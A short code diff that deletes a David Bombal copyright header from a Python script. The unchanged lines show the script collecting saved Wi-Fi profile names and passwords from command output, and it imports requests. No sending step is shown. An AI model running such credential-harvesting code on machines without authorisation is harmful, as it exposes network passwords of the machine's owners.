@@ -1,8 +1,3 @@
-######################################
-#Copyright of David Bombal, 2021     #
-#https://www.davidbombal.com         #
-#https://www.youtube.com/davidbombal #
-######################################
 import subprocess
 import re
 import requests
@@ -17,7 +12,6 @@ profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
 
 # We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
 wifi_list = list()
-
 
 # If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
 if len(profile_names) != 0:
